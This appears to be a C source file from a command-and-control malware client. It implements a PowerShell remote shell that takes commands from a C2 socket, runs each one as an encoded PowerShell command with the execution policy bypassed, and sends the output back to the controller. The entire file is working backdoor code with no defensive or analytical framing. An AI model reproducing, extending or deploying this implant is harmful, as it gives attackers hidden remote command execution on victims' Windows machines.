#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "c2.h"
#include "client/client_psh.h"

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode binary data to Base64 text
static void b64_encode(const unsigned char *in, int len, char *out) {
    int i = 0, j = 0;
    unsigned char c3[3];
    while (len--) {
        c3[i++] = *(in++);
        if (i == 3) {
            out[j++] = b64[c3[0] >> 2];
            out[j++] = b64[((c3[0] & 3) << 4) | (c3[1] >> 4)];
            out[j++] = b64[((c3[1] & 15) << 2) | (c3[2] >> 6)];
            out[j++] = b64[c3[2] & 63];
            i = 0;
        }
    }
    if (i) {
        out[j++] = b64[c3[0] >> 2];
        out[j++] = b64[((c3[0] & 3) << 4) | (i == 2 ? (c3[1] >> 4) : 0)];
        out[j++] = (i == 2 ? b64[(c3[1] & 15) << 2] : '=');
        out[j++] = '=';
    }
    out[j] = '\0';
}

int psh_exec(sock_t sock, const char *cmd) {
    if (!cmd || !*cmd) return -1;

    int cmdlen = (int)strlen(cmd);

    // powershell -enc expects Base64 of UTF-16LE encoded command
    unsigned short unicode[4096] = {0};
    if (cmdlen > (int)(sizeof(unicode)/sizeof(unicode[0]) - 1)) return -1;
    for (int i = 0; i < cmdlen; i++) unicode[i] = (unsigned short)(unsigned char)cmd[i];

    char encoded[8192];
    b64_encode((unsigned char*)unicode, cmdlen * 2, encoded);

    char fullcmd[8192];
    // Compose final command string for _popen
    snprintf(fullcmd, sizeof(fullcmd), "powershell.exe -ep bypass -enc %s", encoded);

    // Launch PowerShell and capture stdout pipe
    FILE *fp = _popen(fullcmd, "r");
    if (!fp) {
        send(sock, "[-] PowerShell failed\r\n" C2_EOF_MARK "\r\n", 35, 0);
        return -1;
    }

    char buf[C2_BUF_SIZE];
    while (fgets(buf, sizeof(buf), fp)) {
        printf("%s", buf);
        send(sock, buf, (int)strlen(buf), 0);
    }

    _pclose(fp);
    send(sock, C2_EOF_MARK, C2_EOF_MARK_LEN, 0);
    return 0;
}

void psh_receive(sock_t sock, char *buf) {
    char cmd[2048];

    while (1) {
        // Clear previous command contents
        memset(cmd, 0, sizeof(cmd));
        int i = 0;

        while (1) {
            int r = recv(sock, buf + i, 1, 0);
            if (r <= 0) break;

            if (buf[i] == '\n') {
                buf[i] = '\0';
                strcpy(cmd, buf); // safe if buf fits in cmd
                break;
            }
            i++;
            if (i >= sizeof(cmd) - 1) { // prevent overflow
                buf[i] = '\0';
                strcpy(cmd, buf);
                break;
            }
        }

        if (!strlen(cmd)) continue;
        if (strcmp(cmd, "quit") == 0) break; // Quit powershell session
        printf("C2> %s\n", cmd);

        if (psh_exec(sock, cmd) < 0) {
            send(sock, "[-] PS helper failed\r\n" C2_EOF_MARK "\r\n", 31, 0);
        }
    }
    return;
}
